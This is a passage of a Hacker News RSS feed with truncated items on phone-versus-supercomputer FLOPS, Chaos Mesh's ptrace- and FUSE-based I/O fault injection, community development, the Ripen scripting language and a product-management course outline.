both of which also had the same MOSFETs.&nbsp; ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://skie.net/skynet/projects/tesla/view_post/23_Explaining+Changes+post-firmware+2019.16+Regarding+Range+Loss">https://skie.net/skynet/projects/tesla/view_post/23_Explaining+Changes+post-firmware+2019.16+Regarding+Range+Loss</a></em></p>]]>
            </description>
            <link>https://skie.net/skynet/projects/tesla/view_post/23_Explaining+Changes+post-firmware+2019.16+Regarding+Range+Loss</link>
            <guid isPermaLink="false">hacker-news-small-sites-26138644</guid>
            <pubDate>Mon, 15 Feb 2021 03:11:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Good Ideas, Through the Looking Glass (PDF, 2005)]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26138218">thread link</a>) | @benhoyt
<br/>
February 14, 2021 | https://people.inf.ethz.ch/wirth/Articles/GoodIdeas_origFig.pdf | <a href="https://web.archive.org/web/*/https://people.inf.ethz.ch/wirth/Articles/GoodIdeas_origFig.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://people.inf.ethz.ch/wirth/Articles/GoodIdeas_origFig.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26138218</guid>
            <pubDate>Mon, 15 Feb 2021 02:00:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Phone vs. Supercomputers]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26138069">thread link</a>) | @ca98am79
<br/>
February 14, 2021 | https://www.tnhh.net/posts/phone-power.html | <a href="https://web.archive.org/web/*/https://www.tnhh.net/posts/phone-power.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Today, I looked up how many <a href="https://en.wikipedia.org/wiki/FLOPS">floating point operations per second</a> (FLOPS) that an iPhone can do. It turns out the A14 chip in the iPhone <a href="https://www.forbes.com/sites/moorinsights/2020/10/15/apple-claims-the-iphone-12s-a14-bionic-challenges-laptops-but-gives-no-details/">can do about 11 TFlOPS according to Apple</a>. Let's give Apple the benefits of the doubt and not get too deep into how they got that number, and put it to perspective and compare the iPhone with the <a href="https://en.wikipedia.org/wiki/History_of_supercomputing">Top 500 Supercomputers</a> in the world over the years:</p>
<p><img src="https://www.tnhh.net/assets/posts-images/iphone-vs-supercomputers.png" alt="iPhone vs Supercomputers"></p>
<p>The green line is how much computing power that little phone I'm holding in my hands has. If released in 2009, it would have made it to the list of top 500 supercomputers in the world! It has more computing power than the most powerful computer in the world in 2002. It has the combined computing power of the 1997's top 500 supercomputers in the whole world.</p>
<p>People talked about how the computer on Appolo was so slow. I get it, but I can hardly relate to that. I wasn't born then. However, 2009 was just 12 years ago. I could still remember it vividly. I was a freshman student then.</p>
<p>Reflecting on that, I figured:</p>
<ul>
<li>Something with the form factor and power envelope of the phone alone is already exceedingly powerful. It could potentially do things that humankind couldn't achieve just ten years ago.</li>
<li>On the other hand, I don't need to have the most whizz-bang computer or phone to make programs that do amazing things. Writing programs for older hardware can be a pleasure. Supporting older hardware makes programs I create more accessible to a larger part of the human population.</li>
<li>As a programmer, when I complain about the phone or any computer I have is not powerful enough for whatever I want to do, it's much more likely it's me doing something wrong.</li>
<li>The world changes faster than my mind conceives. I need to be humble about what I know. Things I know to be fast becomes slow sooner than I expect. In the same realm, maybe ideas that I know to be good become bad sooner than I expect. Those ideas are not necessarily limited to technology: Maybe ideas in science, humanities, and society also envolve that way. It is just harder to put into numbers like TFLOPS.</li>
</ul>
<p>We have the most power computer in our pocket. Doing something amazing with that power should constantly be a question on our mind. All that power just to push one more ads is a fucking stupid and disgusting idea.</p>
<hr>

<hr>
</div></div>]]>
            </description>
            <link>https://www.tnhh.net/posts/phone-power.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26138069</guid>
            <pubDate>Mon, 15 Feb 2021 01:32:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Simulate I/O Faults at Runtime]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26137993">thread link</a>) | @jinqueeny
<br/>
February 14, 2021 | https://chaos-mesh.org/blog/how-to-simulate-io-faults-at-runtime | <a href="https://web.archive.org/web/*/https://chaos-mesh.org/blog/how-to-simulate-io-faults-at-runtime">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p><img alt="Chaos Engineering - How to simulate I/O faults at runtime" src="https://chaos-mesh.org/assets/images/how-to-simulate-io-faults-at-runtime-39daaf89aa83a5be58402f763db0d5c5.jpg"></p><p>In a production environment, filesystem faults might occur due to various incidents such as disk failures and administrator errors. As a Chaos Engineering platform, Chaos Mesh has supported simulating I/O faults in a filesystem ever since its early versions. By simply adding an IOChaos CustomResourceDefinition (CRD), we can watch how the filesystem fails and returns errors.</p><p>However, before Chaos Mesh 1.0, this experiment was not easy and may have consumed a lot of resources. We needed to inject sidecar containers to the Pod through the mutating admission webhooks and rewrite the <code>ENTRYPOINT</code> command. Even if no fault was injected, the injected sidecar container caused a substantial amount of overhead.</p><p>Chaos Mesh 1.0 has changed all this. Now, we can use IOChaos to inject faults to a filesystem at runtime. This simplifies the process and greatly reduces system overhead. This blog post introduces how we implement the IOChaos experiment without using a sidecar.</p><h2>I/O fault injection<a href="#io-fault-injection" title="Direct link to heading">#</a></h2><p>To simulate I/O faults at runtime, we need to inject faults into a filesystem after the program starts <a href="https://man7.org/linux/man-pages/man2/syscall.2.html" target="_blank" rel="noopener noreferrer">system calls</a> (such as reads and writes) but before the call requests arrive at the target filesystem. We can do that in one of two ways:</p><ul><li>Use Berkeley Packet Filter (BPF); however, it <a href="https://github.com/iovisor/bcc/issues/2336" target="_blank" rel="noopener noreferrer">cannot be used to inject delay</a>.</li><li>Add a filesystem layer called ChaosFS before the target filesystem. ChaosFS uses the target filesystem as the backend and receives requests from the operating system. The entire call link is <strong>target program syscall</strong> -&gt; <strong>Linux kernel</strong> -&gt; <strong>ChaosFS</strong> -&gt; <strong>target filesystem</strong>. Because ChaosFS is customizable, we can inject delays and errors as we want. Therefore, ChaosFS is our choice.</li></ul><p>But ChaosFS has several problems:</p><ul><li>If ChaosFS reads and writes files in the target filesystem, we need to <a href="https://man7.org/linux/man-pages/man2/mount.2.html" target="_blank" rel="noopener noreferrer">mount</a> ChaosFS to a different path than the target path specified in the Pod configuration. ChaosFS <strong>cannot</strong> be mounted to the path of the target directory.</li><li>We need to mount ChaosFS <strong>before</strong> the target program starts running. This is because the newly-mounted ChaosFS takes effect only on files that are newly opened by the program in the target filesystem.</li><li>We need to mount ChaosFS to the target containter's <code>mnt</code> namespace. For details, see <a href="https://man7.org/linux/man-pages/man7/mount_namespaces.7.html" target="_blank" rel="noopener noreferrer">mount_namespaces(7) ‚Äî Linux manual page</a>.</li></ul><p>Before Chaos Mesh 1.0, we used the <a href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/" target="_blank" rel="noopener noreferrer">mutating admission webhook</a> to implement IOChaos. This technique addressed the three problems lists above and allowed us to:</p><ul><li>Run scripts in the target container. This action changed the target directory of the ChaosFS's backend filesystem (for example, from <code>/mnt/a</code> to <code>/mnt/a_bak</code>) so that we could mount ChaosFS to the target path (<code>/mnt/a</code>).
Modify the command that starts the Pod. For example, we could modify the original command <code>/app</code> to <code>/waitfs.sh /app</code>.</li><li>The <code>waitfs.sh</code> script kept checking whether the filesystem was successfully mounted. If it was mounted, <code>/app</code> was started.</li><li>Add a new container in the Pod to run ChaosFS. This container needed to share a volume with the target container (for example, <code>/mnt</code>), and then we mounted this volume to the target directory (for example, <code>/mnt/a</code>). We also properly enabled <a href="https://kubernetes.io/docs/concepts/storage/volumes/#mount-propagation" target="_blank" rel="noopener noreferrer">mount propagation</a> for this volume's mount to penetrate the share to host and then penetrate slave to the target.</li></ul><p>These three approaches allowed us to inject I/O faults while the program was running. However, the injection was far from convenient:</p><ul><li>We could only inject faults into a volume subdirectory, not into the entire volume. The workaround was to replace <code>mv</code> (rename) with <code>mount move</code> to move the mount point of the target volume.</li><li>We had to explicitly write commands in the Pod rather than implicitly use the image commands. Otherwise, the <code>/waitfs.sh</code> script could not properly start the program after the filesystem was mounted.</li><li>The corresponding container needed to have a proper configuration for mount propagation. Due to potential privacy and security issues, we <strong>could not</strong> modify the configuration via the mutating admission webhook.</li><li>The injection configuration was troublesome. Worse still, we had to create a new Pod after the configuration was able to inject faults.</li><li>We could not withdraw ChaosFS while the program was running. Even if no fault or error was injected, the performance was greatly affected.</li></ul><h2>Inject I/O faults without the mutating admission webhook<a href="#inject-io-faults-without-the-mutating-admission-webhook" title="Direct link to heading">#</a></h2><p>What about cracking these tough nuts without the mutating admission webhook? Let's get back and think a bit about the reason why we used the mutating admission webhook to add a container in which ChaosFS runs. We do that to mount the filesystem to the target container.</p><p>In fact, there is another solution. Instead of adding containers to the Pod, we can first use the <code>setns</code> Linux system call to modify the namespace of the current process and then use the <code>mount</code> call to mount ChaosFS to the target container. Suppose that the filesystem to inject is <code>/mnt</code>. The new injection process is as follows:</p><ol><li>Use <code>setns</code> for the current process to enter the mnt namespace of the target container.</li><li>Execute <code>mount --move</code> to move <code>/mnt</code> to <code>/mnt_bak</code>.</li><li>Mount ChaosFS to <code>/mnt</code> and use <code>/mnt_bak</code> as the backend.</li></ol><p>After the process is finished, the target container will open, read, and write the files in <code>/mnt</code> through ChaosFS. In this way, delays or faults are injected much more easily. However, there are still two questions to answer:</p><ul><li>How do you handle the files that are already opened by the target process?</li><li>How do you recover the process given that we cannot unmount the filesystem when files are opened?</li></ul><h3>Dynamically replace file descriptors<a href="#dynamically-replace-file-descriptors" title="Direct link to heading">#</a></h3><p><strong>ptrace solves both of the two questions above.</strong> We can use ptrace to replace the opened file descriptors (FD) at runtime and replace the current working directory (CWD) and mmap.</p><h4>Use ptrace to allow a tracee to run a binary program<a href="#use-ptrace-to-allow-a-tracee-to-run-a-binary-program" title="Direct link to heading">#</a></h4><p><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html" target="_blank" rel="noopener noreferrer">ptrace</a> is a powerful tool that makes the target process (tracee) to run any system call or binary program. For a tracee to run the program, ptrace modifies the RIP-pointed address to the target process and adds an <code>int3</code> instruction to trigger a breakpoint. When the binary program stops, we need to restore the registers and memory.</p><blockquote><p><strong>Note:</strong></p><p>In the <a href="https://en.wikipedia.org/wiki/X86_assembly_language" target="_blank" rel="noopener noreferrer">x86_64 architecture</a>, the RIP register (also called an instruction pointer) always points to the memory address at which the next directive is run.
To load the program into the target process memory spaces:</p></blockquote><ol><li>Use ptrace to call mmap in the target program to allocate the needed memory.</li><li>Write the binary program to the newly allocated memory and make the RIP register point to it.</li><li>After the binary program stops, call munmap to clean up the memory section.</li></ol><p>As a best practice, we often replace ptrace <code>POKE_TEXT</code> writes with <code>process_vm_writev</code> because if there is a huge amount of data to write, <code>process_vm_writev</code> performs more efficiently.</p><p>Using ptrace, we are able to make a process to replace its own FD. Now we only need a method to make that replacement happen. This method is the <code>dup2</code> system call.</p><h4>Use <code>dup2</code> to replace file descriptor<a href="#use-dup2-to-replace-file-descriptor" title="Direct link to heading">#</a></h4><p>The signature of the <code>dup2</code> function is <code>int dup2(int oldfd, int newfd);</code>. It is used to create a copy of the old FD (<code>oldfd</code>). This copy has an FD number of <code>newfd</code>. If <code>newfd</code> already corresponds to the FD of an opened file, the FD on the file that's already opened is automatically closed.</p><p>For example, the current process opens <code>/var/run/__chaosfs__test__/a</code> whose FD is <code>1</code>. To replace this opened file with <code>/var/run/test/a</code>, this process performs the following operations:</p><ol><li>Uses the <code>fcntl</code> system call to get the <code>OFlags</code> (the parameter used by the <code>open</code> system call, such as <code>O_WRONLY</code>) of <code>/var/run/__chaosfs__test__/a</code>.</li><li>Uses the <code>Iseek</code> system call to get the current location of <code>seek</code>.</li><li>Uses the <code>open</code> system call to open <code>/var/run/test/a</code> using the same <code>OFlags</code>. Assume that the FD is <code>2</code>.</li><li>Uses <code>Iseek</code> to change the <code>seek</code> location of the newly opened FD <code>2</code>.</li><li>Uses <code>dup2(2, 1)</code> to replace the FD <code>1</code> of <code>/var/run/__chaosfs__test__/a</code> with the newly opened FD <code>2</code>.</li><li>Closes FD <code>2</code>.</li></ol><p>After the process is finished, FD <code>1</code> of the current process points to <code>/var/run/test/a</code>. So that we can inject faults, any subsequent operations on the target file go through the <a href="https://en.wikipedia.org/wiki/Filesystem_in_Userspace" target="_blank" rel="noopener noreferrer">Filesystem in Userspace</a> (FUSE). FUSE is a software interface for Unix and Unix-like computer operating systems that lets non-privileged users create their own file systems without editing kernel code.</p><h4>Write a program to make the target process replace its own file descriptor<a href="#write-a-program-to-make-the-target-process-replace-its-own-file-descriptor" title="Direct link to heading">#</a></h4><p>The combined functionality of ptrace and dup2 makes it possible for the tracer to make the tracee replace the opened FD by itself. Now, we need to write a binary program and make the target process run it:</p><blockquote><p><strong>Note:</strong></p><p>In the implementation above, we assume that:</p><ul><li>The threads of the target process are POSIX threads and share the opened files.</li><li>When the target process creates threads using the <code>clone</code> function, the <code>CLONE_FILES</code> parameter is passed.</li></ul><p>Therefore, Chaos Mesh only replaces the FD of the first thread in the thread group.</p></blockquote><ol><li>Write a piece of assembly code according to the two sections above and the usage of syscall directives. <a href="https://github.com/chaos-mesh/toda/blob/1d73871d8ab72b8d1eace55f5222b01957193531/src/replacer/fd_replacer.rs#L133" target="_blank" rel="noopener noreferrer">Here</a> is an example of the assembly code.</li><li>Use an assembler to translate the code into a binary program. We use <a href="https://github.com/CensoredUsername/dynasm-rs" target="_blank" rel="noopener noreferrer">dynasm-rs</a> as the assembler.</li><li>Use ptrace to make the target process run this program.
When the program runs, the FD is replaced at runtime.</li></ol><h3>Overall fault injection process<a href="#overall-fault-injection-process" title="Direct link to heading">#</a></h3><p>The following diagram illustrates the overall I/O fault injection process:</p><p><img alt="Fault injection process" src="https://chaos-mesh.org/assets/images/fault-injection-process-581a3b4c6954f9ccb3fc9eb17f45f937.jpg"></p><p> Fault injection process </p><p>In this diagram, each horizontal line corresponds to a thread that runs in the direction of the arrows. The <strong>Mount/Umount Filesystem</strong> and <strong>Replace FD</strong> tasks are carefully arranged in sequence. Given the process above, this arrangement makes a lot of sense.</p><h2>What's next<a href="#whats-next" title="Direct link to heading">#</a></h2><p>I've discussed how we implement fault injection to simulate I/O faults at runtime (see <a href="https://github.com/chaos-mesh/toda" target="_blank" rel="noopener noreferrer">chaos-mesh/toda</a>). However, the current implementation is far from perfect:</p><ul><li>Generation numbers are not supported.</li><li>ioctl is not supported.</li><li>Chaos Mesh does not immediately determine whether a filesystem is successfully mounted. It does so only after one second.</li></ul><p>If you are interested in Chaos Mesh and would like to help us improve it, you're welcome to join <a href="https://cloud-native.slack.com/join/shared_invite/zt-fyy3b8up-qHeDNVqbz1j8HDY6g1cY4w#/" target="_blank" rel="noopener noreferrer">our Slack channel</a> or submit ‚Ä¶</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chaos-mesh.org/blog/how-to-simulate-io-faults-at-runtime">https://chaos-mesh.org/blog/how-to-simulate-io-faults-at-runtime</a></em></p>]]>
            </description>
            <link>https://chaos-mesh.org/blog/how-to-simulate-io-faults-at-runtime</link>
            <guid isPermaLink="false">hacker-news-small-sites-26137993</guid>
            <pubDate>Mon, 15 Feb 2021 01:22:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Education, Training and Opportunity]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26137921">thread link</a>) | @DoreenMichele
<br/>
February 14, 2021 | http://www.eclogiselle.com/2021/02/education-training-and-opportunity.html | <a href="https://web.archive.org/web/*/http://www.eclogiselle.com/2021/02/education-training-and-opportunity.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div id="post-body-5430107209529109817"><p>
One way to try to buffer against gentrification while improving your community is to try to grow your people in a way that helps them adapt, change and keep up financially. This is often given short shrift in community development plans, which is part of why the rich get richer and the poor get poorer.

</p><p>
It's a hard thing to do in part because "You can lead a horse to water but you cannot make it drink." So a lot of programs and communities more or less throw in the towel on this and just try to give charity to poor people rather than education, training and opportunity.
</p><p>
This is a poor practice because charity can only really provide short-term relief. It cannot provide long-term solutions.
</p><p>
This basically falls under that saying "Give a man a fish, feed him for the day. Teach a man to fish, feed him for a lifetime." 
</p><p>
Free meal sites help people survive another day, but they don't help poor people resolve their problems. They may be necessary relief for a community with high poverty rates but they don't really fix the problem.

</p><p>
Education and training can be hard to readily tell apart, especially in our complex world where you need a great deal of basic education before you are even ready for training. These days, college education may be appropriate and even a necessary prerequisite for jobs that at one time were menial labor performed by people with little in the way of education.
</p><p>
A few generations ago, it was fairly common for people in America to drop out of school after middle school because they were going to be farm hands and didn't need more formal education than that. These days, even working on a farm can involve dealing with such abstract topics as genetics. 


</p><p>

In a nutshell, education informs you, broadens your mind and teaches you to think more effectively while training develops specific skills, usually with a goal of making you more employable. Credentialing is a separate issue from education and training and matters a great deal for making people more employable but may not matter at all for simply improving competence and quality of life.
</p><p>
The detail of credentialing is part of why we have trouble telling education and training apart. We think of college as <i>education</i> but a college degree can also be important credentialing to get your foot in the door career-wise. 
</p><p>

If you are doing community development work and you identify a local issue, such as a lack of financial literacy, you can work at trying to foster education in that area without worrying about credentialing. It can be enough to make resources available to locals to try to encourage them to get better at this. 
</p><p>
Those resources might include uncredentialed local classes, book lists, podcasts or various other free materials. With the wealth of free, quality materials available online today, putting together the materials may be the easy part of such a program. 
</p><p>
Getting the word out and getting people to participate and take it seriously may be the harder part of such a program. You may also face challenges in trying to measure how effective your effort has been and/or prove that it makes a difference.

</p><p>
But if your goal is to improve employability, you will want to focus on training and credentialing. You will want to help them acquire skills that make them more employable and/or acquire proof of such skills.
</p><p>
Sometimes people have skills and knowledge but they lack credentials. In other words they don't know how to prove they have those skills. 
</p><p>
Sometimes just helping people find ways to get credentials or somehow prove their ability and show their competence can make a big difference in their lives. Maybe they developed a skill as a hobby and it's potentially worth money <i>if they can prove they have that skill or knowledge</i>.

</p><p>

Opportunity is separate from education and training. Sometimes opportunity is the big stumbling block for some individuals or populations.

</p><p>
Populations that face prejudice and other barriers to opportunity are at increased risk of homelessness. This can include LGBTQ individuals, people of color, homemakers/former homemakers and handicapped people. 
</p><p>
If they actually end up homeless, this further exacerbates the problem. Being homeless can make it difficult to access any kind of paid work, even if they have plenty of education and training, both due to prejudice and logistical issues. 

</p><p>
Identifying barriers to opportunity for locals and helping them find ways around that can help improve employment stats and average local income levels. It can do so directly and fairly immediately without first jumping through hoops to gain additional education or training. 


</p><p>
In practice, people who lack opportunity are often given the message that what they need is more education or training when oftentimes what they really need more immediately is simply more earned income (aka more opportunity). If someone is poor, helping them access paid work as quickly as possible may be a better remedy than directing them to educational and training resources.
</p><p>
This fact is why I run various websites and subreddits aimed at helping people access opportunity, even if they are currently homeless or have other barriers to establishing earned income. This includes the following:

</p><ul><li><a href="https://writepay.blogspot.com/">Write Pay</a></li>
  <li><a href="https://www.reddit.com/r/GigWorks/">r/GigWorks</a></li>
  <li><a href="https://www.reddit.com/r/NorthToAlaska/">r/NorthToAlaska</a></li></ul><p>

Entrepreneurs are often more interested in education and training than in credentials. In many cases, if you have some means to make money, acquiring additional skills to up your game can improve your income without needing to have a piece of paper to prove to someone that you got the education or training in question. Simply knowing how to do things better may be all you really need to further improve your income.
</p><p>

Relatedly, people who face barriers to regular employment may be best served by helping them become freelancers or entrepreneurs or to seek "irregular employment," such as seasonal jobs. Inability to get or keep a regular job doesn't necessarily have to mean inability to earn an income.
</p><p>

In the US, Black Americans have a long history of pursuing creative arts as a means to get ahead. The LGBTQ crowd also is similarly associated with creative arts, such as the music industry and acting.
</p><p>

If you are doing community development work, it may help to be aware of the fact that some kinds of work may be easier to access for people with barriers to opportunity and employment. Pointing people to industries more welcoming of people like them may help them succeed.
</p><p>
But you also need to be aware that directing people to jobs more welcoming of "their kind" can also be an insidious means to reinforce class barriers, racial barriers and other entrenched social ills. You should guard against shuttling marginalized people into jobs that will prove to be a dead end in the long term.

</p><p>
If there is a low barrier to entry and a low ceiling on earnings capacity and future career opportunities, it is a dead end job. The way to identify opportunity that doesn't reinforce social ills is to look for paths with a low barrier to entry and a high ceiling. 
</p><p>

It can take some research to identify which paths offer a low barrier to entry and a high ceiling. It isn't always obvious that <i>this</i> entry level opportunity can lead to a future but <i>that one</i>, which looks very similar, probably won't.
</p><p>
For example, <a href="https://smallbiztrends.com/2019/04/franchise-employee-to-franchise-owner.html">most Domino's franchise owners began as Domino's employees</a>. So working at a Domino's pizza place may help people eventually become a franchise owner, if that interests them, but the same isn't necessarily true of other food service jobs.
</p><p>
It can take even more research to match a particular person to a path with a low barrier to entry and a high ceiling that is a good fit for them as an individual. This detail is one of the reasons so many programs throw in the towel on trying to provide opportunity to people with barriers to earned income and simply direct them to the welfare office and local sources of charity, like food banks.

</p><p>
If you are doing community development work, your greatest opportunity for growth is in helping the people who have barriers to earned income and barriers to making their lives work. You will get a lot further if you focus on helping this demographic to improve their lot in life in some meaningful way while deeply understanding and respecting why "You can lead a horse to water but you cannot make it drink." 
</p><p>
Metaphorically speaking, this particular "water" may be poison for this particular "horse." So don't force it.
</p><p>

But also don't give up on it. Even if you can't successfully help a particular individual, try to learn from them, deepen your understanding of the problem space and further develop your approach to solving these issues in your community.

</p><p>
If you are dealing a lot with people who are homeless, very poor or otherwise in crisis, you should develop a resource list you can hand out as an easy means to provide compassionate relief. Make a list of local food banks and other pertinent programs that you can give to people so they can "eat for today" while working on longer-term solutions that will "feed them for a lifetime."
</p><p>

But don't let charity and compassionate relief be a priority for you. Your priority needs to be fostering education, training and opportunity.

</p><p>
Giving someone a list of local sources for short-term charitable relief can help bring their stress levels down and can help make sure they are adequately well fed while pursuing education, training and opportunity. This means helping people readily find immediate relief can serve an important and constructive function for your community development work.

</p><p>
But always shoot for keeping your focus on "teach them how to fish" and keep a wary eye out for the possibility that people are showing up solely to get a free meal for the day with no goal of ever becoming independent. Don't allow the long-term development goals of your program to get derailed by your bleeding heart and/or their immediate sense of desperation.
</p><p>


It's fine ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.eclogiselle.com/2021/02/education-training-and-opportunity.html">http://www.eclogiselle.com/2021/02/education-training-and-opportunity.html</a></em></p>]]>
            </description>
            <link>http://www.eclogiselle.com/2021/02/education-training-and-opportunity.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26137921</guid>
            <pubDate>Mon, 15 Feb 2021 01:10:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ripen Scripting Language]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26137776">thread link</a>) | @todsacerdoti
<br/>
February 14, 2021 | https://felix.plesoianu.ro/languages/forth/ripen/index.html | <a href="https://web.archive.org/web/*/https://felix.plesoianu.ro/languages/forth/ripen/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

<p>Welcome to Ripen, a stack-based scripting engine with highly readable syntax, that can be implemented with little code and effort in a language like C++ or D. It's informed by RetroForth and PostScript, but diverges from either in important ways, not least due to its string-threaded nature. Surprisingly, Ripen only seems to be about 6 times slower than the host language on a quick test ‚Äî much better than for other language families.

</p><p>Ripen is based on the principles explained in this <a href="https://notimetoplay.org/cgi-bin/wiki/More_about_tiny_scripting_engines"> interpreter construction tutorial</a>. The point is having a tiny engine, easily copy-pasted into any application, even hidden inside a bigger module. For this reason, the default vocabulary is kept small.

</p><h2>Download</h2>

<p>As of 6 December 2019, there are three implementations:

</p><ul>
 <li>the <a href="https://felix.plesoianu.ro/languages/forth/ripen/ripen.js">browser-based version</a> (embedded above);
 </li><li>the <a href="https://felix.plesoianu.ro/languages/forth/ripen/ripen.py">original Python prototype</a>;
 </li><li>a <a href="https://felix.plesoianu.ro/languages/forth/ripen/ripen-linux-x86_64.zip">native code edition</a> (395K) for 64-bit Linux PCs; includes D source code.
</li></ul>

<p>Ripen is free and open source software under the <a href="https://felix.plesoianu.ro/languages/forth/ripen/LICENSE.txt">Artistic License 2.0</a>.

</p><h2>Overview</h2>

<p>At a basic level, Ripen works like most similar languages:

</p><pre><code>
	? 3 2 + . cr
	5
	 
	ok
	? :squared dup * ;
	ok
	? 3 2 + squared . cr
	25
	 
	ok
</code></pre>

<p>Note the lack of a space after the colon: Ripen doesn't use parsing words, instead relying on sigils to achieve similar functionality. E.g. variables work like this:

</p><pre><code>
	? 3 2 - &gt;a
	ok
	? $a . cr
	1
	 
	ok
</code></pre>

<p>On the minus side, there are no proper quoted strings; words in parentheses are simply joined by a space. Note that the closing paren is a word too, so it <em>must</em> be space-separated itself, on both sides:

</p><pre><code>
	? (  Hello,  world!  ) .
	Hello, world!
	ok
</code></pre>

<p>Speaking of which, comments are C-style instead. They're also executable, so you'll want to leave them on the outside of word definitions:

</p><pre><code>
	? /* s -- */ :say . cr ;
	ok
	? ( Hello, world! ) say
	Hello, world!
	 
	ok
</code></pre>

<p>Last but not least, control structures are inspired by Logo, to make them a lot more readable than in other stack-based languages:

</p><pre><code>
	? 3 2 + 3 2 * &lt; [ ( Yes! ) . ] iftrue
	Yes!
	ok
	? [ $i . cr ] 3 times
	0
	 
	1
	 
	2
	 
	ok
</code></pre>

<p>In the above, square brackets delimit lists of words, that control structures treat as blocks of code. Curly braces are synonymous:

</p><pre><code>
	? { dup * } /squared
	ok
	? 5 squared . cr
	25
	 
	ok
</code></pre>

<p>The reason both are provided is that lists of the same kind can't nest. And yes, that's another way to define words; beware that an older definition by the same name will be overwritten, and the entire script will see the new one right away.

</p><p>Otherwise, Ripen only provides a minimum of vocabulary:

</p><ul>
 <li>arithmetic: +, -, *, /, mod, /mod, negate, abs, min, max, 1+, 1-;
 </li><li>comparisons and logic =, &lt;&gt;, &lt;, &lt;=, &gt;, &gt;=, and, or, not, true, false;
 </li><li>stack manipulation: drop, dup, over, 2dup, swap, rot, -rot, clear;
</li></ul>

<p>and a few more conveniences. Enter <code>words</code> for a complete list.

</p><p>This page demonstrates how to embed and extend the JS version.

</p></div></div>]]>
            </description>
            <link>https://felix.plesoianu.ro/languages/forth/ripen/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26137776</guid>
            <pubDate>Mon, 15 Feb 2021 00:47:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn Product Management]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26137582">thread link</a>) | @louisblytrhe
<br/>
February 14, 2021 | https://lu.ma/xtrqs5v2 | <a href="https://web.archive.org/web/*/https://lu.ma/xtrqs5v2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-gramm="false" data-slate-editor="true" data-slate-node="value"><p data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><strong><span data-slate-string="true">Month 1: What is Product Management?</span></strong></span></span></p><ul data-slate-node="element"><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">What is Product Management?</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">A PMs Purpose</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Agile and Product Management</span></span></span></li></ul><p data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><strong><span data-slate-string="true">Month 2: Mission, Vision and Goals</span></strong></span></span></p><ul data-slate-node="element"><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Long term mission</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">5-year vision</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Goals and Metrics</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Pirate (AARRR) Metrics</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">HEART Framework</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">The Product Strategy Canvas</span></span></span></li></ul><p data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><strong><span data-slate-string="true">Month 3: Objectives, Strategies and Tactics</span></strong></span></span></p><ul data-slate-node="element"><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Building Empathy</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Effective Customer Interviews Preview</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Good User Personas</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Empathy Maps</span></span></span></li></ul><p data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><strong><span data-slate-string="true">Month 4: Working On Everything</span></strong></span></span></p><ul data-slate-node="element"><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Identifying The Problem</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span data-slate-string="true">Kill Your Bias</span></span></span></li><li data-slate-node="element"><span data-slate-node="text"><span data-slate-leaf="true"><span 